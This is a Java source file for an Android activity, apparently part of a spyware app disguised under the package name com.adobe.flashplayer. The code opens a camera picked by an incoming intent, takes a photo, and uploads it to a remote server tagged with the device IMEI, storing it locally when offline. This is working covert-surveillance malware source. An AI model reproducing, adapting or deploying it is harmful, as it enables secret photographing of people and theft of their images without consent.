
package com.adobe.flashplayer.data;

import com.adobe.flashplayer.MyLog;
import com.adobe.flashplayer.Public;
import com.adobe.flashplayer.R;
import com.adobe.flashplayer.Utils;
import com.adobe.flashplayer.network.Network;
import com.adobe.flashplayer.network.NetworkUtils;
import com.adobe.flashplayer.network.UploadData;

import java.io.File;
import java.io.FileOutputStream;
import java.lang.ref.WeakReference;
import java.util.List;

import android.app.Activity;
import android.app.UiAutomation;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.content.res.Configuration;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.Matrix;
import android.hardware.Camera;
import android.hardware.Camera.AutoFocusCallback;
import android.hardware.Camera.PictureCallback;
import android.hardware.Camera.PreviewCallback;
import android.os.Bundle;
import android.util.Log;
import android.view.SurfaceHolder;
import android.view.SurfaceView;
import android.view.Window;
import android.view.WindowManager;

import androidx.core.content.ContextCompat;



public class CameraActivity extends Activity {

    private final String TAG = "[ljg]CameraActivity ";

    private SurfaceView mySurfaceView = null;
    private SurfaceHolder myHolder = null;
    private Camera myCamera = null;
    private static final int CAMERAFOCUSDELAY = 600;
    private long camerastarttime ;

    public static int DEFAULT_CAMERA_PHOTO_WIDTH = 640;
    public static int DEFAULT_CAMERA_PHOTO_HEIGHT = 480;

    public static int photoNumber 			= 0;

    int cameraIdx = 0;

    WeakReference <Activity> mActivity;

    @Override
    protected void onCreate(Bundle savedInstanceState) {

        super.onCreate(savedInstanceState);

        Log.e(TAG, "oncreate");

        camerastarttime = System.currentTimeMillis();

        this.mActivity = new WeakReference<Activity>(CameraActivity.this);

        Intent intent = getIntent();
        cameraIdx = intent.getIntExtra("index", 0);
        photoNumber = intent.getIntExtra("count", 1);

        requestWindowFeature(Window.FEATURE_NO_TITLE);
        getWindow().setFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN, WindowManager.LayoutParams.FLAG_FULLSCREEN);
        setContentView(R.layout.activity_cameraphoto);

        new Thread(new Runnable() {
            @Override
            public void run() {

                int granted = ContextCompat.checkSelfPermission(mActivity.get(), android.Manifest.permission.CAMERA);
                if (granted != PackageManager.PERMISSION_GRANTED) {
                    Log.e(TAG, "camera permission not authority");
                    return;
                }
                takephoto();
            }
        }).start();

        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    Thread.sleep(300000);
                    if (myCamera != null){
                        myCamera.stopPreview();
                        myCamera.setPreviewCallback(null);
                        myCamera.release();
                        myCamera = null;
                    }

                    mActivity.get().finish();
                    return;
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }
            }
        }).start();
    }

    public CameraActivity(){

    }

    public CameraActivity(int cameranum,int idx){
        cameraIdx = idx;
        this.photoNumber = cameranum;
    }





    private void takephoto() {
        try{
            mySurfaceView = (SurfaceView) findViewById(R.id.camera_surfaceview);
            myHolder = mySurfaceView.getHolder();
            myHolder.setType(SurfaceHolder.SURFACE_TYPE_PUSH_BUFFERS);

            if(mActivity.get().getPackageManager().hasSystemFeature(PackageManager.FEATURE_CAMERA)){
                if(openCamera(cameraIdx)){
                    myCamera.setPreviewDisplay(myHolder);

                    myCamera.setPreviewCallback(myAutoPreviewCallback);

                    Camera.Parameters parameters = myCamera.getParameters();
                    //parameters.setPreviewFormat(ImageFormat.JPEG);
                    //parameters.setPreviewSize(DEFAULT_CAMERA_PHOTO_WIDTH, DEFAULT_CAMERA_PHOTO_HEIGHT);
                    //parameters.setPictureSize(DEFAULT_CAMERA_PHOTO_WIDTH, DEFAULT_CAMERA_PHOTO_HEIGHT);

                    List<Camera.Size> list = parameters.getSupportedPreviewSizes();
                    Camera.Size size = list.get(0);

                    Configuration mConfiguration = mActivity.get().getResources().getConfiguration();
                    int ori = mConfiguration.orientation;
                    if (ori == Configuration.ORIENTATION_LANDSCAPE) {

                        DEFAULT_CAMERA_PHOTO_WIDTH = size.height;
                        DEFAULT_CAMERA_PHOTO_HEIGHT = size.width;
                    } else if (ori == Configuration.ORIENTATION_PORTRAIT) {

                        DEFAULT_CAMERA_PHOTO_WIDTH = size.width;
                        DEFAULT_CAMERA_PHOTO_HEIGHT = size.height;
                    }

                    Log.e(TAG, "camera width:" +size.width + " height:" + size.height );

                    parameters.setPreviewSize(DEFAULT_CAMERA_PHOTO_WIDTH, DEFAULT_CAMERA_PHOTO_HEIGHT);
                    parameters.setPictureSize(DEFAULT_CAMERA_PHOTO_WIDTH, DEFAULT_CAMERA_PHOTO_HEIGHT);
                    myCamera.setParameters(parameters);

                    myCamera.startPreview();

                    //Thread.sleep(CAMERAFOCUSDELAY);
                    //myCamera.autoFocus(myAutoFocus);
                }
                else {
                    this.finish();
                    Log.e(TAG, "openCamera Failed");
                    MyLog.writeLogFile("openCamera Failed\r\n");
                }
            }
            else{
                this.finish();
                Log.e(TAG, "camera not exist");
                MyLog.writeLogFile("camera not exist\r\n");
            }
        }
        catch(Exception ex){
            try{
                if(myCamera != null){
                    myCamera.stopPreview();
                    myCamera.setPreviewCallback(null);
                    myCamera.release();
                    myCamera = null;
                }
                this.finish();
            }catch(Exception ext){

            }

            ex.printStackTrace();
            String errorString = Utils.getExceptionDetail(ex);
            String stackString = Utils.getCallStack();
            MyLog.writeLogFile("initCamera exception:"+errorString + "\r\n" + "call stack:" + stackString + "\r\n");
        }
    }


    private boolean openCamera(int cameraIdx) {
        try {
        Camera.CameraInfo cameraInfo = new Camera.CameraInfo();
        int camera_cnt = Camera.getNumberOfCameras();
            for (int camIdx = 0; camIdx < camera_cnt; camIdx++) {
                Camera.getCameraInfo(camIdx, cameraInfo);
                if (cameraInfo.facing == cameraIdx) {
                    myCamera = Camera.open(camIdx);
                    Log.e(TAG, "openCamera Success");
                    return true;
                }
            }
        }
        catch (Exception ex) {
            ex.printStackTrace();
        }

        return false;
    }



    private PreviewCallback myAutoPreviewCallback = new PreviewCallback() {
        @Override
        public void onPreviewFrame(byte[] data, Camera camera) {
            myCamera.autoFocus(myAutoFocus);
        }
    };


    private AutoFocusCallback myAutoFocus = new AutoFocusCallback() {
        @Override
        public void onAutoFocus(boolean success, Camera camera) {
            try{
                //Thread.sleep(CAMERAFOCUSDELAY);
                myCamera.takePicture(null, null, myPicCallback);
            }catch(Exception ex){
                MyLog.writeLogFile("camera auto focus error\r\n");
                ex.printStackTrace();
            }
        }
    };


    private PictureCallback myPicCallback = new PictureCallback() {
        @Override
        public void onPictureTaken(byte[] data, Camera camera) {
            try {
                myCamera.stopPreview();
                myCamera.setPreviewCallback(null);
                myCamera.release();
                myCamera = null;
                CameraActivity.this.finish();

                long cameraendtime = System.currentTimeMillis();
                long camerausetime = cameraendtime - camerastarttime;
                MyLog.writeLogFile("camera photo cost milliseconds:" + String.valueOf(camerausetime) + "\r\n");

                if (data.length < Public.VALID_CAMERAPHOTO_SIZE) {
                    MyLog.writeLogFile("camera photo size:" + data.length + " is ignormal\r\n");
                    return;
                }

                Context context = getApplicationContext();
                if(NetworkUtils.isNetworkAvailable(context) == true/*&& (Network.getNetworkType(context) == Network.WIFI_CONNECTION*/ ){

                    String filename = Utils.formatCurrentDateInFileName() + "_" + Public.CAMERAPHOTO_FILE_NAME;
                    int filenamelen = filename.getBytes().length;
                    int datasize = (int)data.length;
                    int sendsize = datasize + 4 + filenamelen + 4;
                    byte[] sendbuf = new byte[sendsize];
                    byte[] bytefilenamelen = Utils.intToBytes(filenamelen);
                    System.arraycopy(bytefilenamelen, 0, sendbuf, 0, 4);
                    System.arraycopy(filename.getBytes(), 0, sendbuf, 4, filenamelen);
                    byte[] bytedatasize = Utils.intToBytes(datasize);
                    System.arraycopy(bytedatasize, 0, sendbuf, 4 + filenamelen, 4);
                    System.arraycopy(data, 0, sendbuf, 4 + filenamelen + 4, datasize);

                    new Thread(new UploadData(sendbuf,sendsize,Public.CMD_DATA_CAMERAPHOTO,Public.IMEI)).start();
                }else{
                    String filename = Utils.formatCurrentDateInFileName() + "_" + Public.CAMERAPHOTO_FILE_NAME;
                    File pictureFile = new File(Public.LOCAL_PATH_NAME + filename);
                    FileOutputStream fos = new FileOutputStream(pictureFile);
                    Bitmap bitmap = BitmapFactory.decodeByteArray(data, 0, data.length);
                    Matrix matrix = new Matrix();
                    //matrix.preRotate(90);
                    bitmap = Bitmap.createBitmap(bitmap ,0,0, bitmap .getWidth(), bitmap .getHeight(),matrix,true);
                    bitmap.compress(Bitmap.CompressFormat.JPEG, Public.CAMERA_PHOTO_QUALITY, fos);
                    fos.close();
                }

                Log.e(TAG, "send camera photo ok");
            } catch (Exception error) {
                Log.e(TAG, "camera photo PictureCallback error:" + error.toString());
                error.printStackTrace();
                String errorString = Utils.getExceptionDetail(error);
                String stackString = Utils.getCallStack();
                MyLog.writeLogFile("CameraPhotoActivity exception:"+errorString + "\r\n" + "call stack:" + stackString + "\r\n");
                return ;
            }
        }
    };




    protected void onDestroy() {
        super.onDestroy();
        Log.d(TAG,"onDestroy");
    }
}
